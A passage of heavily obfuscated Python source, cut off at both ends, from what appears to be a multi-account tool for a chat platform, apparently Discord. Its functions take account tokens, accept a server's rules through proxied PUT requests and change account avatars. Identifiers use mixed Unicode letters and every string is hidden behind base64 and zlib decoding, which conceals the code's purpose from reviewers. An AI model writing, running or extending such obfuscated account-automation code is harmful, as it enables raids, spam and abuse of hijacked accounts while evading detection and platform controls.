𝗱𝙖𝘵𝗲𝙩𝗶𝙢𝘦.datetime.now().strftime(f"{𝙜}{__𝙞𝘮𝘱𝗼𝙧𝘵__(𝗹𝗠𝘐𝗜𝘔𝗹𝙈𝘕𝘐𝗜𝘕𝘔𝘭𝗹𝙄𝗠𝙡𝗠𝘭𝙄𝗠𝗜𝗠𝙄𝙉𝘔𝙄𝙡𝙡𝗹𝗡𝙡[𝙧𝗼𝙪𝘯𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝗿, 𝘭𝘤, 𝘳, 𝙣𝗻, 𝘨))
    else:
        𝘱𝙧𝘪𝗻𝘵(__𝙞𝙢𝗽𝘰𝙧𝘵__(𝘭𝙈𝙄𝗜𝙈𝘭𝙈𝙉𝙄𝘐𝗡𝙈𝘭𝙡𝘐𝗠𝙡𝙈𝗹𝗜𝙈𝗜𝙈𝙄𝗡𝘔𝙄𝙡𝘭𝙡𝘕𝘭[𝗿𝗼𝙪𝘯𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝗿𝘁__(𝙡𝙈𝙄𝙄𝘔𝙡𝘔𝗡𝙄𝙄𝘕𝘔𝙡𝙡𝙄𝗠𝘭𝘔𝙡𝗜𝘔𝘐𝙈𝘐𝗡𝗠𝘐𝙡𝙡𝗹𝙉𝗹[𝗿𝘰𝙪𝗻𝙙(𝘢𝙗𝘴(0.22151710538742742 + 0.9751564859143251j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝗿, 𝘥𝙖𝘵𝗲𝘵𝗶𝗺𝘦.datetime.now().strftime(f"{𝗴}{__𝘪𝗺𝘱𝗼𝗿𝘁__(𝗹𝙈𝗜𝗜𝘔𝘭𝙈𝙉𝘐𝗜𝗡𝙈𝙡𝘭𝙄𝘔𝘭𝘔𝗹𝘐𝘔𝘐𝗠𝘐𝗡𝘔𝗜𝗹𝘭𝘭𝗡𝗹[𝙧𝙤𝙪𝗻𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝗿, 𝘣, 𝙧, 𝙣𝘯, 𝗴, 𝙧𝙧.text))

def accept_ruless(token, guild):
    𝙙𝗻 = 𝘵𝙤𝘬𝗲𝘯.split(__𝘪𝙢𝗽𝘰𝘳𝙩__(𝗹𝗠𝘐𝘐𝘔𝙡𝙈𝘕𝗜𝗜𝗡𝙈𝗹𝗹𝘐𝘔𝘭𝙈𝗹𝗜𝗠𝙄𝘔𝙄𝗡𝗠𝙄𝘭𝙡𝗹𝙉𝘭[𝗿𝙤𝘶𝗻𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__(𝘭𝙈𝙄𝙄𝙈𝗹𝙈𝗡𝘐𝗜𝘕𝘔𝙡𝙡𝘐𝗠𝗹𝘔𝙡𝙄𝙈𝙄𝘔𝘐𝗡𝘔𝗜𝘭𝘭𝗹𝙉𝙡[𝙧𝙤𝘂𝗻𝘥(𝘢𝘣𝘴(0.16306951699861416 + 0.9866145816000484j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝗻𝘯 = 𝗱𝙣[𝗿𝙤𝘶𝗻𝗱(𝙖𝗯𝙨(0.0 + 0j))]
    𝘩𝗲𝗮𝗱𝗲𝗿𝙨 = 𝗛𝘦𝘢𝙙𝙚𝙧𝘴(𝙩𝗼𝙠𝗲𝗻)
    try:
        if 𝙥𝘳𝗼𝙭𝙮:
            𝙣𝗶𝙜 = 𝘳𝘦𝙦𝙪𝙚𝘴𝘵𝘴.get(__𝙞𝘮𝙥𝘰𝘳𝘵__(𝗹𝙈𝗜𝙄𝗠𝘭𝘔𝘕𝙄𝙄𝗡𝘔𝙡𝘭𝗜𝙈𝗹𝙈𝗹𝙄𝙈𝗜𝗠𝙄𝙉𝙈𝘐𝙡𝘭𝘭𝘕𝗹[𝗿𝗼𝙪𝙣𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝙤𝗿𝙩__(𝙡𝘔𝙄𝗜𝘔𝙡𝗠𝗡𝙄𝘐𝘕𝘔𝙡𝙡𝘐𝙈𝘭𝘔𝗹𝘐𝙈𝗜𝗠𝘐𝙉𝙈𝗜𝙡𝗹𝘭𝗡𝘭[𝗿𝗼𝘂𝘯𝗱(𝘢𝙗𝘀(0.676244201780188 + 0.7366775275238661j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\xf412\xccI\n\xf7\xcaI\xce44\x8a\x8a\xf0*\x88\xca\xcd\xc9\x8a\x8c\x08*H22\xd1O1\xca1Ht\xb3\xccK\t\xcf)\x8er1\xcc\x8d\x0c\xaf\xa8\x8a\n\xb4\xb5\x05\x00\xac\x13!\xc8')).decode().format(𝗴𝙪𝘪𝗹𝘥), headers=𝗵𝗲𝗮𝙙𝘦𝘳𝘴, proxy={__𝘪𝘮𝘱𝘰𝙧𝘵__(𝗹𝗠𝙄𝗜𝗠𝘭𝗠𝙉𝙄𝗜𝗡𝗠𝘭𝙡𝘐𝙈𝗹𝙈𝗹𝘐𝘔𝘐𝘔𝗜𝙉𝘔𝙄𝙡𝗹𝙡𝗡𝘭[𝗿𝘰𝘶𝘯𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝘰𝙧𝘵__(𝗹𝙈𝘐𝘐𝘔𝙡𝗠𝘕𝙄𝗜𝘕𝘔𝗹𝘭𝙄𝙈𝗹𝙈𝙡𝗜𝘔𝗜𝙈𝘐𝗡𝗠𝗜𝙡𝙡𝘭𝗡𝗹[𝙧𝙤𝘂𝘯𝙙(𝘢𝘣𝙨(0.7889361912764833 + 0.6144751305741805j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝘪𝘮𝙥𝘰𝘳𝘵__(𝘭𝙈𝘐𝘐𝗠𝘭𝗠𝘕𝘐𝙄𝗡𝙈𝘭𝗹𝗜𝙈𝙡𝘔𝘭𝘐𝘔𝗜𝗠𝘐𝙉𝘔𝗜𝗹𝗹𝘭𝗡𝙡[𝙧𝙤𝘂𝘯𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__(𝙡𝙈𝗜𝘐𝘔𝗹𝘔𝘕𝙄𝙄𝙉𝘔𝗹𝗹𝙄𝘔𝗹𝘔𝙡𝗜𝗠𝘐𝗠𝗜𝗡𝗠𝗜𝘭𝙡𝘭𝘕𝗹[𝗿𝘰𝙪𝙣𝗱(𝘢𝘣𝘀(0.15980204721517566 + 0.9871490797776387j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝗮𝗻𝙙𝘰𝘮.choice(𝗽𝘳𝗼𝘅𝘪𝘦𝙨), __𝘪𝗺𝙥𝗼𝗿𝘁__(𝙡𝗠𝙄𝙄𝙈𝙡𝗠𝙉𝘐𝘐𝙉𝙈𝙡𝗹𝗜𝙈𝘭𝙈𝗹𝗜𝘔𝘐𝘔𝙄𝗡𝗠𝘐𝗹𝗹𝙡𝘕𝗹[𝘳𝙤𝘂𝙣𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝘳𝙩__(𝘭𝘔𝗜𝗜𝗠𝗹𝙈𝘕𝙄𝘐𝘕𝗠𝗹𝘭𝙄𝙈𝘭𝘔𝙡𝗜𝘔𝙄𝘔𝘐𝘕𝘔𝘐𝙡𝗹𝘭𝙉𝘭[𝗿𝘰𝘂𝘯𝙙(𝙖𝗯𝙨(0.6970604424780492 + 0.7170123705573749j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝙞𝘮𝙥𝗼𝙧𝘁__(𝗹𝗠𝗜𝙄𝙈𝙡𝗠𝗡𝘐𝘐𝙉𝘔𝘭𝘭𝗜𝙈𝗹𝗠𝗹𝘐𝗠𝗜𝘔𝗜𝙉𝗠𝙄𝘭𝘭𝗹𝘕𝗹[𝗿𝙤𝘶𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝘳𝘵__(𝙡𝘔𝗜𝙄𝗠𝘭𝙈𝗡𝙄𝙄𝙉𝘔𝘭𝘭𝘐𝙈𝘭𝙈𝘭𝘐𝙈𝗜𝙈𝙄𝙉𝗠𝗜𝘭𝙡𝗹𝙉𝗹[𝘳𝙤𝙪𝘯𝙙(𝘢𝗯𝘴(0.5566495158172873 + 0.830747444498254j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝙧𝙖𝙣𝗱𝗼𝗺.choice(𝗽𝙧𝘰𝙭𝙞𝙚𝙨)}).json()
        else:
            𝙣𝗶𝘨 = 𝗿𝙚𝘲𝙪𝘦𝙨𝘁𝘴.get(__𝙞𝗺𝙥𝗼𝘳𝙩__(𝗹𝘔𝙄𝘐𝙈𝙡𝗠𝗡𝗜𝙄𝙉𝙈𝗹𝗹𝙄𝙈𝘭𝘔𝙡𝗜𝘔𝙄𝗠𝗜𝙉𝙈𝗜𝙡𝙡𝘭𝗡𝙡[𝗿𝘰𝘂𝙣𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝙤𝘳𝙩__(𝘭𝙈𝗜𝗜𝗠𝘭𝙈𝘕𝘐𝘐𝗡𝗠𝘭𝘭𝘐𝙈𝗹𝗠𝗹𝙄𝙈𝘐𝗠𝙄𝗡𝗠𝗜𝘭𝙡𝗹𝗡𝙡[𝗿𝘰𝙪𝗻𝘥(𝘢𝗯𝘀(0.306296741684872 + 0.9519360829557995j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\xf412\xccI\n\xf7\xcaI\xce44\x8a\x8a\xf0*\x88\xca\xcd\xc9\x8a\x8c\x08*H22\xd1O1\xca1Ht\xb3\xccK\t\xcf)\x8er1\xcc\x8d\x0c\xaf\xa8\x8a\n\xb4\xb5\x05\x00\xac\x13!\xc8')).decode().format(𝘨𝘂𝘪𝘭𝘥), headers=𝘩𝗲𝙖𝘥𝘦𝗿𝘀).json()
        if 𝘱𝘳𝘰𝙭𝘺:
            𝗿𝘳 = 𝘳𝙚𝙦𝘶𝘦𝙨𝘵𝙨.put(__𝘪𝗺𝗽𝙤𝗿𝙩__(𝘭𝘔𝙄𝙄𝘔𝗹𝗠𝙉𝙄𝙄𝘕𝙈𝘭𝗹𝘐𝘔𝗹𝙈𝘭𝙄𝘔𝗜𝗠𝘐𝘕𝙈𝗜𝙡𝘭𝙡𝗡𝙡[𝘳𝘰𝙪𝙣𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__(𝙡𝙈𝗜𝘐𝙈𝗹𝘔𝙉𝘐𝘐𝗡𝗠𝘭𝘭𝘐𝙈𝙡𝘔𝙡𝙄𝙈𝙄𝙈𝙄𝗡𝙈𝗜𝗹𝙡𝗹𝙉𝘭[𝙧𝗼𝘶𝘯𝙙(𝘢𝙗𝘀(0.0839900114784905 + 0.9964665965158306j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\xf41\xf6\xcaI\x8e\x08\xcbI6\x06\xf2\r\x9cJ\xa2\x02mm\x01\x1a\xda\x16\xea')).decode().format(𝗴𝙪𝘪𝙡𝘥), headers=𝙝𝙚𝘢𝗱𝙚𝘳𝘴, json=𝗻𝘪𝘨, proxy={__𝘪𝗺𝙥𝗼𝘳𝙩__(𝙡𝗠𝗜𝗜𝘔𝙡𝘔𝘕𝙄𝙄𝘕𝘔𝘭𝙡𝘐𝘔𝘭𝗠𝗹𝘐𝘔𝗜𝙈𝙄𝘕𝘔𝙄𝘭𝗹𝗹𝙉𝙡[𝗿𝗼𝙪𝗻𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝘰𝘳𝘵__(𝙡𝙈𝘐𝙄𝘔𝘭𝗠𝙉𝙄𝙄𝗡𝘔𝗹𝗹𝙄𝘔𝙡𝙈𝙡𝙄𝗠𝗜𝙈𝙄𝙉𝙈𝗜𝙡𝙡𝘭𝙉𝙡[𝘳𝘰𝙪𝗻𝙙(𝘢𝙗𝘀(0.9371063287676331 + 0.3490440209825242j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝗶𝙢𝘱𝗼𝘳𝙩__(𝘭𝗠𝗜𝗜𝘔𝙡𝗠𝗡𝗜𝘐𝘕𝘔𝘭𝗹𝘐𝗠𝘭𝗠𝗹𝗜𝗠𝘐𝙈𝘐𝙉𝗠𝘐𝙡𝙡𝘭𝙉𝙡[𝘳𝘰𝙪𝘯𝙙(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝗿𝘵__(𝘭𝘔𝙄𝘐𝙈𝙡𝘔𝘕𝙄𝗜𝗡𝘔𝙡𝘭𝘐𝙈𝙡𝙈𝙡𝘐𝘔𝗜𝘔𝗜𝙉𝗠𝗜𝗹𝙡𝗹𝗡𝙡[𝗿𝗼𝘂𝘯𝗱(𝗮𝘣𝘴(0.29742238055230175 + 0.9547460015871246j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝘳𝗮𝗻𝗱𝗼𝗺.choice(𝙥𝗿𝗼𝘹𝗶𝙚𝘀), __𝙞𝘮𝗽𝙤𝗿𝙩__(𝗹𝙈𝗜𝘐𝗠𝙡𝗠𝗡𝘐𝙄𝗡𝗠𝙡𝗹𝙄𝗠𝙡𝙈𝗹𝘐𝙈𝙄𝗠𝗜𝗡𝗠𝙄𝙡𝙡𝗹𝗡𝗹[𝘳𝗼𝘶𝗻𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝘳𝙩__(𝙡𝘔𝘐𝘐𝘔𝙡𝙈𝙉𝗜𝗜𝘕𝙈𝗹𝙡𝗜𝗠𝘭𝘔𝙡𝗜𝗠𝗜𝘔𝘐𝙉𝘔𝙄𝙡𝘭𝘭𝙉𝘭[𝗿𝙤𝘂𝗻𝘥(𝙖𝙗𝙨(0.26910354757065247 + 0.9631112504196436j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝘪𝙢𝘱𝗼𝗿𝘁__(𝙡𝘔𝗜𝗜𝘔𝘭𝘔𝘕𝗜𝘐𝗡𝙈𝗹𝘭𝘐𝙈𝘭𝙈𝗹𝘐𝙈𝙄𝙈𝗜𝙉𝘔𝘐𝙡𝗹𝙡𝗡𝙡[𝙧𝗼𝘶𝘯𝙙(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__(𝗹𝙈𝗜𝙄𝗠𝙡𝙈𝗡𝙄𝘐𝗡𝙈𝗹𝙡𝙄𝙈𝘭𝗠𝗹𝘐𝘔𝙄𝗠𝗜𝘕𝘔𝗜𝙡𝘭𝗹𝗡𝙡[𝘳𝗼𝙪𝙣𝙙(𝗮𝘣𝘀(0.6922004926740682 + 0.7217052569725242j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝗮𝗻𝗱𝙤𝗺.choice(𝘱𝗿𝙤𝘅𝗶𝘦𝘀)})
        else:
            𝙧𝘳 = 𝗿𝘦𝙦𝘂𝙚𝘴𝘁𝘴.put(__𝙞𝙢𝙥𝗼𝗿𝙩__(𝗹𝗠𝘐𝘐𝙈𝘭𝙈𝘕𝗜𝘐𝙉𝗠𝗹𝙡𝗜𝗠𝙡𝗠𝗹𝘐𝙈𝘐𝘔𝘐𝘕𝘔𝙄𝙡𝘭𝘭𝗡𝗹[𝙧𝘰𝘶𝙣𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝘳𝙩__(𝙡𝗠𝘐𝘐𝙈𝗹𝘔𝙉𝘐𝗜𝗡𝗠𝙡𝗹𝙄𝘔𝙡𝙈𝘭𝗜𝙈𝙄𝘔𝙄𝘕𝗠𝙄𝗹𝗹𝘭𝘕𝘭[𝙧𝘰𝘶𝙣𝙙(𝙖𝘣𝘀(0.21970134886284576 + 0.97556717723991j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\xf41\xf6\xcaI\x8e\x08\xcbI6\x06\xf2\r\x9cJ\xa2\x02mm\x01\x1a\xda\x16\xea')).decode().format(𝗴𝙪𝗶𝗹𝘥), headers=𝙝𝘦𝘢𝙙𝙚𝙧𝘀, json=𝙣𝘪𝘨)
    except:
        pass
    if 𝘳𝙧.status_code == 𝗿𝙤𝘂𝙣𝙙(𝙖𝙗𝘴(77.23204437638177 + 185.56996341392266j)):
        𝙥𝗿𝘪𝗻𝙩(__𝘪𝙢𝘱𝗼𝘳𝘵__(𝗹𝗠𝘐𝙄𝗠𝙡𝗠𝘕𝘐𝗜𝙉𝘔𝘭𝗹𝗜𝗠𝙡𝙈𝗹𝘐𝙈𝙄𝙈𝙄𝙉𝗠𝘐𝙡𝗹𝗹𝘕𝗹[𝗿𝗼𝘂𝗻𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__(𝗹𝘔𝗜𝙄𝘔𝘭𝘔𝗡𝘐𝘐𝙉𝘔𝙡𝘭𝗜𝙈𝙡𝙈𝗹𝗜𝙈𝙄𝗠𝙄𝗡𝙈𝙄𝗹𝘭𝙡𝙉𝘭[𝘳𝙤𝘶𝙣𝗱(𝙖𝗯𝘀(0.8891816241244083 + 0.45755441132118874j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3\x82\xf3\x0bS\x8d\rl\x01\xfc\xfa\x0cv')).decode().format(𝙧, 𝘥𝗮𝙩𝗲𝙩𝘪𝙢𝙚.datetime.now().strftime(f"{𝙜}{__𝘪𝘮𝗽𝗼𝗿𝙩__(𝘭𝗠𝙄𝘐𝗠𝙡𝙈𝗡𝗜𝗜𝗡𝘔𝘭𝘭𝙄𝘔𝙡𝗠𝗹𝗜𝙈𝙄𝘔𝘐𝙉𝘔𝗜𝘭𝘭𝘭𝙉𝗹[𝘳𝘰𝘶𝙣𝙙(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝘳, 𝗹𝙘, 𝙧, 𝘯𝙣, 𝙜))
    else:
        𝗽𝗿𝘪𝙣𝙩(__𝙞𝗺𝘱𝙤𝘳𝘵__(𝙡𝗠𝗜𝘐𝘔𝘭𝙈𝗡𝘐𝙄𝙉𝙈𝘭𝙡𝗜𝙈𝗹𝙈𝗹𝘐𝘔𝘐𝘔𝗜𝘕𝘔𝘐𝘭𝘭𝗹𝗡𝙡[𝙧𝗼𝙪𝗻𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝘳𝘵__(𝘭𝙈𝗜𝗜𝗠𝙡𝙈𝗡𝘐𝘐𝗡𝙈𝘭𝗹𝘐𝗠𝘭𝙈𝗹𝙄𝙈𝘐𝙈𝗜𝙉𝘔𝘐𝘭𝙡𝗹𝗡𝙡[𝙧𝘰𝙪𝗻𝗱(𝘢𝙗𝙨(0.717316702567658 + 0.6967472627986866j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+Hr\x0f\xcb\x86\x89yg\x16\x98\xa7E\x94X\x02\x00\x01t\x0c\xde')).decode().format(𝘳, 𝗱𝘢𝙩𝙚𝘵𝙞𝙢𝗲.datetime.now().strftime(f"{𝙜}{__𝘪𝗺𝗽𝙤𝗿𝘁__(𝘭𝘔𝗜𝙄𝙈𝙡𝘔𝘕𝗜𝙄𝗡𝙈𝗹𝙡𝘐𝘔𝘭𝘔𝗹𝘐𝙈𝘐𝗠𝙄𝗡𝗠𝗜𝙡𝘭𝗹𝘕𝘭[𝗿𝘰𝘶𝗻𝙙(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝗿, 𝙡𝗰, 𝗿, 𝗻𝘯, 𝙜, 𝘳𝗿.text))

def avatar_changer(token):
    𝘥𝙣 = 𝘵𝘰𝘬𝗲𝙣.split(__𝘪𝙢𝘱𝗼𝘳𝘵__(𝙡𝙈𝘐𝘐𝗠𝗹𝘔𝗡𝘐𝗜𝙉𝘔𝙡𝗹𝘐𝗠𝘭𝘔𝗹𝙄𝗠𝗜𝙈𝗜𝙉𝗠𝘐𝘭𝗹𝗹𝘕𝘭[𝗿𝙤𝘂𝗻𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝗿𝘁__(𝗹𝗠𝙄𝗜𝘔𝙡𝙈𝗡𝘐𝗜𝙉𝗠𝗹𝗹𝘐𝙈𝗹𝗠𝙡𝘐𝙈𝗜𝘔𝗜𝗡𝘔𝙄𝘭𝙡𝙡𝘕𝗹[𝘳𝗼𝙪𝘯𝗱(𝗮𝙗𝙨(0.8598556867637834 + 0.510537166071171j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝙣𝘯 = 𝘥𝘯[𝗿𝘰𝘂𝗻𝗱(𝗮𝘣𝙨(0.0 + 0j))]
    𝗵𝗲𝙖𝙙𝗲𝙧𝘴 = {__𝘪𝙢𝗽𝗼𝘳𝘵__(𝙡𝙈𝗜𝙄𝘔𝘭𝙈𝗡𝗜𝘐𝘕𝘔𝗹𝘭𝙄𝙈𝗹𝘔𝘭𝗜𝙈𝘐𝗠𝘐𝙉𝙈𝗜𝘭𝙡𝘭𝗡𝗹[𝘳𝙤𝘂𝗻𝘥(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝗿𝘁__(𝘭𝗠𝗜𝙄𝗠𝗹𝘔𝗡𝘐𝗜𝘕𝙈𝘭𝗹𝗜𝙈𝗹𝘔𝗹𝗜𝙈𝙄𝙈𝘐𝗡𝗠𝗜𝙡𝘭𝙡𝗡𝘭[𝗿𝘰𝙪𝗻𝙙(𝙖𝙗𝙨(0.43352142903634794 + 0.9011432575158529j))]).decompress(b'x\xda\x8b\x8c\x083Ht\xb7\xacL\x8c(\xc8Hq\xcf)KJ\xb7\xb5\x05\x00G\xff\x06\xf3')).decode(): 𝘁𝙤𝙠𝗲𝗻}
    𝗽𝘪𝙘𝙩𝘂𝗿𝙚 = [𝘧 for 𝘧 in 𝘰𝙨.listdir(__𝘪𝙢𝗽𝘰𝙧𝙩__(𝗹𝙈𝗜𝘐𝗠𝙡𝗠𝗡𝗜𝗜𝙉𝘔𝘭𝙡𝗜𝘔𝙡𝘔𝘭𝗜𝗠𝘐𝙈𝘐𝙉𝙈𝗜𝙡𝗹𝗹𝙉𝗹[𝗿𝗼𝘂𝙣𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝙧𝘵__(𝘭𝙈𝘐𝙄𝙈𝗹𝗠𝙉𝘐𝗜𝗡𝘔𝘭𝘭𝙄𝘔𝗹𝙈𝗹𝙄𝘔𝙄𝗠𝗜𝗡𝙈𝗜𝘭𝘭𝗹𝙉𝗹[𝗿𝘰𝘶𝗻𝗱(𝘢𝗯𝘴(0.9982811530235374 + 0.05860665080003102j))]).decompress(b'x\xda\x8b\x8c\x88\xcaHqw\xabL\xae\xb4\xb0\x05\x00\x1b\xe2\x04/')).decode()) if 𝗶𝘴𝘧𝗶𝗹𝗲(𝙟𝙤𝙞𝘯(__𝙞𝘮𝙥𝙤𝗿𝙩__(𝗹𝗠𝙄𝘐𝗠𝙡𝘔𝗡𝙄𝘐𝙉𝗠𝙡𝘭𝙄𝗠𝙡𝙈𝘭𝘐𝘔𝘐𝗠𝘐𝗡𝘔𝗜𝘭𝗹𝗹𝙉𝘭[𝙧𝗼𝘂𝗻𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__(𝗹𝘔𝙄𝘐𝗠𝙡𝘔𝘕𝗜𝗜𝙉𝘔𝘭𝙡𝗜𝘔𝗹𝙈𝙡𝗜𝙈𝙄𝗠𝘐𝗡𝘔𝗜𝘭𝘭𝘭𝘕𝗹[𝙧𝗼𝙪𝙣𝘥(𝙖𝙗𝘴(0.3910649449810697 + 0.9203630853130481j))]).decompress(b'x\xda\x8b\x8c\x88\xcaHqw\xabL\xae\xb4\xb0\x05\x00\x1b\xe2\x04/')).decode(), 𝙛))]
    𝙧𝘢𝗻𝙙𝘰𝙢_𝘱𝘪𝘤𝘵𝙪𝙧𝗲 = 𝘳𝗮𝙣𝙙𝗼𝗺.choice(𝘱𝗶𝗰𝘵𝙪𝙧𝘦)
    with 𝘰𝘱𝘦𝙣(__𝗶𝗺𝘱𝘰𝙧𝘵__(𝗹𝗠𝙄𝗜𝙈𝙡𝗠𝗡𝙄𝗜𝙉𝘔𝗹𝗹𝘐𝘔𝘭𝙈𝙡𝗜𝙈𝙄𝙈𝙄𝙉𝗠𝘐𝘭𝗹𝙡𝗡𝗹[𝘳𝗼𝘶𝙣𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝙧𝘵__(𝗹𝘔𝗜𝘐𝙈𝗹𝗠𝘕𝘐𝙄𝗡𝘔𝙡𝘭𝗜𝗠𝘭𝙈𝙡𝗜𝘔𝘐𝙈𝙄𝗡𝘔𝘐𝘭𝙡𝘭𝗡𝗹[𝘳𝙤𝘂𝘯𝘥(𝘢𝗯𝙨(0.738929909808718 + 0.6737823004428655j))]).decompress(b'x\xda\x8b\x8c\x88\xcaHqw\xabL\xae\xb44O\x0b\xb4\xb5\x05\x00/\xc8\x05[')).decode().format(𝗿𝙖𝘯𝘥𝗼𝘮_𝙥𝗶𝗰𝘁𝘂𝙧𝗲), __𝘪𝗺𝘱𝘰𝘳𝘵__(𝘭𝙈𝗜𝙄𝘔𝗹𝙈𝙉𝘐𝘐𝗡𝙈𝙡𝘭𝗜𝘔𝘭𝘔𝘭𝙄𝘔𝙄𝙈𝘐𝙉𝗠𝘐𝙡𝘭𝘭𝗡𝙡[𝙧𝘰𝘶𝘯𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝗿𝙩__(𝙡𝘔𝘐𝗜𝗠𝙡𝘔𝙉𝙄𝙄𝘕𝘔𝘭𝘭𝗜𝙈𝗹𝗠𝙡𝙄𝗠𝗜𝗠𝘐𝗡𝘔𝙄𝘭𝙡𝘭𝙉𝙡[𝘳𝙤𝘶𝘯𝙙(𝘢𝗯𝙨(0.5265753442281218 + 0.8501284649104717j))]).decompress(b'x\xdaK\xce\xf5,\x02\x00\x03\xdb\x01\x8c')).decode()) as 𝙛:
        𝙚𝙣𝗰𝗼𝙙𝘦𝙙_𝙨𝘵𝘳𝙞𝙣𝙜 = 𝘣𝙖𝘴𝙚64.b64encode(𝙛.read())
    𝗽𝘢𝙮𝗹𝗼𝙖𝙙 = {__𝘪𝙢𝗽𝘰𝗿𝘵__(𝗹𝙈𝘐𝗜𝘔𝘭𝘔𝙉𝙄𝘐𝗡𝗠𝙡𝘭𝙄𝙈𝘭𝙈𝙡𝘐𝗠𝗜𝙈𝗜𝙉𝗠𝙄𝗹𝘭𝙡𝘕𝘭[𝗿𝙤𝘶𝗻𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝘳𝘁__(𝘭𝙈𝗜𝘐𝙈𝙡𝗠𝘕𝘐𝗜𝘕𝙈𝘭𝗹𝙄𝘔𝙡𝙈𝗹𝙄𝘔𝙄𝘔𝙄𝙉𝙈𝗜𝙡𝙡𝗹𝘕𝗹[𝙧𝗼𝘶𝙣𝗱(𝘢𝙗𝙨(0.1320019161403716 + 0.9912494611021336j))]).decompress(b'x\xda\x8b\x8c\x88\xcaHqw\xab\x04\x00\x0c\xc6\x02\xde')).decode(): 